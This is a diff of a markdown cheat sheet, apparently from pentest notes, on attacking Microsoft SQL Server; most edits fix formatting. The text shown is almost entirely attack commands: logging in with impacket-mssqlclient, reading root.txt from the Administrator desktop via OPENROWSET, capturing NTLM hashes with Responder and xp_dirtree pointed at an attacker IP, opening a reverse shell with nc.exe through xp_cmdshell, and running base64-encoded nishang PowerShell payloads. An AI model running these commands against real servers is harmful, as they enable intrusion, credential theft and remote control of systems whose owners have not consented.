@@ -13,7 +13,7 @@ excerpt: "Technical understanding and practical overview"
 > Microsoft SQL Server is a relational database management system (RDBMS) developed by Microsoft, designed to manage and organize data in a structured way using tables that are related to each > other through defined relationships.
 > It allows applications and users to store, retrieve, update, and manage data efficiently using Transact-SQL (T-SQL), Microsoft’s implementation of the SQL language.
 
-###  [+]  Connecting to mssclient [+]
+###  [+]  Connecting to mssqlclient 
 ```bash
    impacket-mssqlclient  -windows-auth $Domain/$user:'$pass'@Domain
     
@@ -26,15 +26,14 @@ excerpt: "Technical understanding and practical overview"
  SELECT SUSER_SID('use_name'); 
  ```
 ### [-]  Reading  files
-``bash
+```bash
 SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
 ```
 
 ### [+] Capture NTLM Hash.
 ```bash
-    responder -I tun0 -dvw
-```
-```bash
+responder -I tun0 -dvw
+ 
 declare @q varchar (200);set @q='\\$IP\any\think';exec master.dbo.xp_dirtree @q;
 exec master ..xp_dirtree '\\$IP\test';
 ```
@@ -72,7 +71,10 @@ EXECUTE('EXEC xp_cmdshell ''C:\Windows\Temp\nc.exe -e cmd.exe $attacker 9001''')
 
 ## [+] Powershell Execution
 
-> [-] Raw code creation:- Use the nishang (tcponelinear.ps1), ===> cat file_name |iconv -t utf-16le | base64 -w0;echo
+> Raw code creation:- Use the nishang (tcponelinear.ps1).
+```bash
+cat file_name |iconv -t utf-16le | base64 -w0;echo
+```
 ```bash
  xp_cmdshell "powershell -enc <encoded_raw_code>"
 
